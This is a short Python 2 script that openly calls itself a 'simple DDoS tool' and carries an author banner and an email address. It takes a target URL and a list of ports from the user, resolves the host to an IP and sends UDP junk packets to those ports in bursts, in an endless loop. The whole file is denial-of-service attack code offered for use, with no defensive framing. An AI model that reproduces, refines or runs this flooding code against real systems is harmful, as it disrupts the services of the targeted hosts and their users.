import socket


s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
msg='SOULIZGODSOULIZGODSOULIZGODSOULIZGODSOULIZGODSOULIZGOD'
def a():
 for i in range(1000):
  for p in ports:
   try:
    s.connect((ip,p))
    s.sendto(msg,(ip,p))
   except socket.error as e:
    print'     \033[91m',e,'\n      error on connection:',i,'\n      port:',p

global ports
ports=[]
def p():
 print'      open ports number:'
 pn=input('      ==>')
 for i in range(1,(pn+1)):
  print'      port',i,':'
  port=input('      ==>')
  ports.append(port)
 return ports

print'\033[92m   +----------------------------+\n\n      [*]MADE BY:\n\n      Chaos Soldier\n      \n      [*]EMAIL:\n\n      trap.leader.123@gmail.com\n'
print'      [*]TYPE:\n\n      SIMPLE DDOS TOOL\n      WORKS ON UDP PROTOCOL\n'
print'   +----------------------------+\n'
while True:
 try:
  print'\033[92m      [TARGET URL]:\n      (www.exemple.com)\n'
  u=raw_input('      ')
  ip=socket.gethostbyname(u)
  print'\n\033[96m      [+]TARGET LOCKED!!!\n\n             [IP]:\n        ',ip
 except socket.error:
  print'\033[91m      [-]TARGET NOT LOCKED: WRONG URL!!!!\n      TRY AGAIN....'
 p()
 j=0
 while True:
  print'\n      \033[92m[*]sending 1000 packets....'
  a()
  j=j+2000
  print'      \033[92 mpackets sent:',j